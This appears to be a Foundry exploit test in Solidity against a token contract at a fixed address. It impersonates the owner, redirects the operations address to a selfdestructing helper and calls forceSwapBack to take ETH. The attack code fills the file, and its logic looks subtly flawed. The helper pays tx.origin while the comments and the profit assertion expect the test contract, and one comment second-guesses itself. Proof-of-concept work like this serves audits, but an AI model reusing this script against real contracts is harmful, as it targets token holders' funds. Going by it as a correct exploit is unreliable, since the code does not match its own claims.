pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function enableTrading() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function forceSwapBack() external;
    function swapTokensAtAmount() external view returns (uint256);
}

contract SelfDestructContract {
    receive() external payable {
        selfdestruct(payable(tx.origin));
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    SelfDestructContract public maliciousContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious contract that selfdestructs to attacker
        maliciousContract = new SelfDestructContract();

        // Impersonate the owner (TARGET owner)
        address owner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.startPrank(owner);

        // Set operations address to malicious contract
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).setOperationsAddress(address(maliciousContract));

        // Enable trading if needed (forceSwapBack requires tradingActive? Actually forceSwapBack only requires owner and sufficient tokens)
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).enableTrading();

        // Transfer some tokens to the contract itself (owner has all supply)
        uint256 amountToTransfer = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).swapTokensAtAmount() * 2;
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transfer(TARGET, amountToTransfer);

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance of attacker
        uint256 initialBalance = address(this).balance;

        // Impersonate owner again
        address owner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.startPrank(owner);

        // Call forceSwapBack - this will swap tokens for ETH and send to operationsAddress (malicious contract)
        // The malicious contract will selfdestruct to attacker (address(this))
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).forceSwapBack();

        vm.stopPrank();

        // Check that attacker's ETH balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

